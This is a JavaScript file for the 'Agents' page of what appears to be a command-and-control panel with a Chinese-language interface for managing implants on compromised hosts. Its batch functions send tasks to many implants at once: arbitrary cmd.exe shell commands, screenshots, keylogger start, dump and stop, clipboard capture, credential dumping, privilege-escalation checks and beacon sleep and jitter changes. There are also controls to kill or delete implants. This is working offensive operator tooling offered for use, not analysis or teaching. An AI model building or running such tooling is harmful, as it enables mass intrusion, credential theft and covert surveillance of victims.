// Agents page - batch operations, time-ago, modals, lock sync

let currentAgentId = '';
let currentHostname = '';

document.addEventListener('DOMContentLoaded', function() {
    const selectAll = document.getElementById('select-all');
    if (selectAll) {
        selectAll.addEventListener('change', function() {
            document.querySelectorAll('.agent-checkbox').forEach(cb => cb.checked = this.checked);
            updateBatchBar();
        });
        document.querySelectorAll('.agent-checkbox').forEach(cb => {
            cb.addEventListener('change', updateBatchBar);
        });
    }
    updateTimeAgo();
    setInterval(updateTimeAgo, 30000);
});

function updateBatchBar() {
    const checked = document.querySelectorAll('.agent-checkbox:checked');
    const bar = document.getElementById('batch-bar');
    const count = document.getElementById('batch-count');
    if (checked.length > 0) {
        bar.classList.remove('hidden');
        bar.classList.add('flex');
        count.textContent = '已选择 ' + checked.length + ' 个';
    } else {
        bar.classList.add('hidden');
        bar.classList.remove('flex');
    }
}

function getSelectedIds() {
    return Array.from(document.querySelectorAll('.agent-checkbox:checked')).map(cb =>
        cb.closest('.agent-row').dataset.agentId
    );
}

function deselectAll() {
    document.querySelectorAll('.agent-checkbox').forEach(cb => cb.checked = false);
    const selectAll = document.getElementById('select-all');
    if (selectAll) selectAll.checked = false;
    updateBatchBar();
}

function batchShell() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    const cmd = prompt('批量执行命令 (将在所有选中 Implant 上执行):', 'whoami');
    if (!cmd) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, command: cmd, shell: 'cmd.exe', task_type: 'shell' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast('已向 ' + data.tasks_created + ' 个 Implant 发送命令' + (data.skipped_locked > 0 ? ' (跳过 ' + data.skipped_locked + ' 个锁定)' : ''));
            deselectAll();
        } else {
            showToast('失败: ' + (data.error || ''), 'error');
        }
    }).catch(err => showToast('错误: ' + err, 'error'));
}

function batchScreenshot() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    if (!confirm('向 ' + ids.length + ' 个 Implant 发送截图命令？')) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'screenshot' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast('已向 ' + data.tasks_created + ' 个 Implant 发送截图命令');
            deselectAll();
        } else {
            showToast('失败: ' + (data.error || ''), 'error');
        }
    }).catch(err => showToast('错误: ' + err, 'error'));
}

function batchKeylogger(action) {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    const actionNames = { start: '启动键盘记录', dump: '导出键盘记录', stop: '停止键盘记录' };
    if (!confirm('向 ' + ids.length + ' 个 Implant ' + actionNames[action] + '？')) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'keylogger_' + action })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast('已向 ' + data.tasks_created + ' 个 Implant ' + actionNames[action]);
            deselectAll();
        } else {
            showToast('失败: ' + (data.error || ''), 'error');
        }
    }).catch(err => showToast('错误: ' + err, 'error'));
}

function batchClipboard() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'clipboard_get' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast('已向 ' + data.tasks_created + ' 个 Implant 获取剪贴板');
            deselectAll();
        } else {
            showToast('失败: ' + (data.error || ''), 'error');
        }
    }).catch(err => showToast('错误: ' + err, 'error'));
}

function batchCredsDump() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    if (!confirm('向 ' + ids.length + ' 个 Implant 发送凭据提取命令？\n此操作可能需要管理员权限。')) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'creds_dump' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast('已向 ' + data.tasks_created + ' 个 Implant 发送凭据提取命令');
            deselectAll();
        } else {
            showToast('失败: ' + (data.error || ''), 'error');
        }
    }).catch(err => showToast('错误: ' + err, 'error'));
}

function batchPrivescCheck() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    if (!confirm('向 ' + ids.length + ' 个 Implant 发送提权侦查命令？')) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'privesc_check' })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast('已向 ' + data.tasks_created + ' 个 Implant 发送提权侦查命令');
            deselectAll();
        } else {
            showToast('失败: ' + (data.error || ''), 'error');
        }
    }).catch(err => showToast('错误: ' + err, 'error'));
}

function batchSleep() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    const interval = prompt('请输入新的睡眠间隔 (秒):', '30');
    if (!interval) return;
    const jitter = prompt('请输入抖动百分比 (0-100):', '20');
    if (!jitter) return;
    fetch('/agents/batch', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ agent_ids: ids, task_type: 'sleep', args: interval + ',' + jitter })
    }).then(r => r.json()).then(data => {
        if (data.success) {
            showToast('已向 ' + data.tasks_created + ' 个 Implant 更改睡眠间隔');
            deselectAll();
        } else {
            showToast('失败: ' + (data.error || ''), 'error');
        }
    }).catch(err => showToast('错误: ' + err, 'error'));
}

function batchDelete() {
    const ids = getSelectedIds();
    if (ids.length === 0) return;
    if (!confirm('确认删除选中的 ' + ids.length + ' 个 Implant？')) return;
    let done = 0;
    ids.forEach(id => {
        fetch('/agents/' + id, { method: 'DELETE' })
            .then(() => { done++; if (done === ids.length) { showToast('已删除 ' + done + ' 个 Implant'); setTimeout(() => location.reload(), 1000); } })
            .catch(() => showToast('删除 Implant 失败', 'error'));
    });
}

function updateTimeAgo() {
    document.querySelectorAll('.time-ago').forEach(el => {
        const ts = parseInt(el.dataset.time);
        if (!ts) return;
        const diff = Math.floor(Date.now() / 1000) - ts;
        if (diff < 60) el.textContent = '刚刚';
        else if (diff < 3600) el.textContent = Math.floor(diff / 60) + 'm前';
        else if (diff < 86400) el.textContent = Math.floor(diff / 3600) + 'h前';
        else el.textContent = Math.floor(diff / 86400) + 'd前';
    });
}

function showOfflineModal(agentId, hostname) {
    currentAgentId = agentId; currentHostname = hostname;
    document.getElementById('modal-hostname').textContent = hostname;
    document.getElementById('offline-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
}
function hideOfflineModal() {
    document.getElementById('offline-modal').classList.add('hidden');
    document.body.style.overflow = '';
}
function confirmOffline() {
    fetch(`/agents/${currentAgentId}/kill`, { method: 'POST', headers: {'Content-Type': 'application/json'} })
        .then(r => r.json()).then(data => {
            hideOfflineModal();
            if (data.success) { showToast('Implant已下线', 'success'); setTimeout(() => location.reload(), 1500); }
            else { showToast('下线失败: ' + (data.error || ''), 'error'); }
        }).catch(err => { hideOfflineModal(); showToast('错误: ' + err, 'error'); });
}
function showDeleteModal(agentId, hostname) {
    currentAgentId = agentId; currentHostname = hostname;
    document.getElementById('delete-hostname').textContent = hostname;
    document.getElementById('delete-modal').classList.remove('hidden');
    document.body.style.overflow = 'hidden';
}
function hideDeleteModal() {
    document.getElementById('delete-modal').classList.add('hidden');
    document.body.style.overflow = '';
}
function confirmDelete() {
    fetch(`/agents/${currentAgentId}`, { method: 'DELETE' })
        .then(r => r.json()).then(data => {
            hideDeleteModal();
            if (data.success) { showToast('Implant已删除', 'success'); setTimeout(() => location.reload(), 1500); }
            else { showToast('删除失败: ' + (data.error || ''), 'error'); }
        }).catch(err => { hideDeleteModal(); showToast('错误: ' + err, 'error'); });
}

document.addEventListener('DOMContentLoaded', function() {
    function refreshLocks() {
        fetch('/api/collab/locks').then(r => r.json()).then(d => {
            if (!d.success || !d.locks) return;
            const lockMap = {};
            d.locks.forEach(l => { lockMap[l.agent_id] = l.username; });
            document.querySelectorAll('.agent-lock').forEach(el => {
                const aid = el.getAttribute('data-agent-id');
                if (lockMap[aid]) {
                    const lockSpan = document.createElement('span');
                    lockSpan.className = 'flex items-center gap-1 text-amber-600';
                    lockSpan.innerHTML = '<i class="fa-solid fa-lock text-[9px]"></i>';
                    lockSpan.appendChild(document.createTextNode(lockMap[aid]));
                    el.innerHTML = '';
                    el.appendChild(lockSpan);
                } else {
                    el.innerHTML = '—';
                }
            });
        }).catch(() => {});
    }
    refreshLocks();
    setInterval(refreshLocks, 30000);
});
